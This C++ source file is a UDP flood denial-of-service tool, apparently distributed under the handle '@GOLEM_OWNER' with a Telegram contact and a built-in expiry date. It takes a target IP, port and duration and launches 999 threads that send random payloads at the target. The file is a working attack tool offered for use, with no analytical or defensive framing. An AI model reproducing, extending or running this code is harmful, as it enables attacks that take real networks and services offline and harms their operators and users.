#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <csignal>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sched.h>

#define PACKET_SIZE 15000
#define PAYLOAD_SIZE 20
#define DEFAULT_THREADS 999

std::atomic<bool> attack_running(true);

void generate_payload(char *buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        buffer[i * 4] = '\\';
        buffer[i * 4 + 1] = 'x';
        buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
        buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
    }
    buffer[size * 4] = '\0';
}

bool is_expired() {
    int expire_day = 20;
    int expire_month = 3;
    int expire_year = 2025;

    time_t now = time(NULL);
    struct tm *current_time = localtime(&now);

    if ((current_time->tm_year + 1900 > expire_year) ||
        (current_time->tm_year + 1900 == expire_year && current_time->tm_mon + 1 > expire_month) ||
        (current_time->tm_year + 1900 == expire_year && current_time->tm_mon + 1 == expire_month && current_time->tm_mday > expire_day))
        return true;

    return false;
}

void udp_attack(const char *ip, int port, int attack_time) {
    struct sockaddr_in server_addr;
    int sock;
    char buffer[PAYLOAD_SIZE * 4 + 1];

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        std::cout << "Error: Could not create socket!" << std::endl;
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        std::cout << "Error: Invalid IP address - " << ip << std::endl;
        close(sock);
        return;
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < attack_time) {
        generate_payload(buffer, PAYLOAD_SIZE);

        if (sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0)
            std::cout << "Error sending packet: " << strerror(errno) << std::endl;
    }
    close(sock);
}

int main(int argc, char *argv[]) {
    // Display the banner
    std::cout << "╔════════════════════════════════════════╗\n";
    std::cout << "║             @GOLEM_OWNER PROGRAM              ║\n";
    std::cout << "║          Copyright ©️ 2025            ║\n";
    std::cout << "╚════════════════════════════════════════╝\n";

    // Check if the binary is expired
    if (is_expired()) {
        std::cout << "╔════════════════════════════════════════╗\n";
        std::cout << "║          BINARY EXPIRED              ║\n";
        std::cout << "║    Please contact the owner at:        ║\n";
        std::cout << "║    Telegram: @GOLEM_OWNER               ║\n";
        std::cout << "╚════════════════════════════════════════╝\n";
        return 1;
    }

    // Ensure correct arguments are passed
    if (argc != 4) {
        std::cout << "Usage: " << argv[0] << " <IP> <PORT> <TIME>" << std::endl;
        return 1;
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    std::cout << "Flood started to " << ip << ":" << port << " with " << DEFAULT_THREADS << " Threads for time " << duration << " seconds." << std::endl;
    std::cout << "WATERMARK: THIS BOT PROVIDE BY @GOLEM_OWNER\nBINARY BY @GOLEM_OWNER" << std::endl;

    std::vector<std::thread> threads;
    for (int i = 0; i < DEFAULT_THREADS; i++) {
        threads.push_back(std::thread(udp_attack, ip, port, duration));
    }

    for (auto &t : threads)
        t.join();

    return 0;
}
